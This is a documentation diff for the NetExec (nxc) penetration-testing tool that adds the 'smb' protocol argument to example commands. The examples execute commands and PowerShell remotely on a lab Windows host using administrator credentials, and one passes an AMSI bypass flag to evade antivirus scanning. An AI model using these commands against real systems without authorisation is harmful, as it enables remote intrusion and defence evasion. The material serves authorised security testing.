@@ -27,7 +27,7 @@ If you want to force nxc to use only one execution method you can specify which 
 In the following example, we try to execute `whoami` on the target using the `-x` flag:
 
 ```
-nxc 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
+nxc smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
 06-05-2016 14:34:35 nxc          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
 06-05-2016 14:34:35 nxc          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
 06-05-2016 14:34:39 nxc          192.168.10.11:445 WIN7BOX         [+] Executed command 
@@ -38,7 +38,7 @@ nxc 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
 You can also directly execute PowerShell commands using the `-X` flag:
 
 ```
-nxc 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
+nxc smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
 06-05-2016 14:36:06 nxc          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
 06-05-2016 14:36:06 nxc          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
 06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         [+] Executed command 
@@ -57,5 +57,5 @@ nxc 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
 ### Bypass AMSI
 
 ```
-nxc 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'  --amsi-bypass /path/payload
+nxc smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'  --amsi-bypass /path/payload
 ```
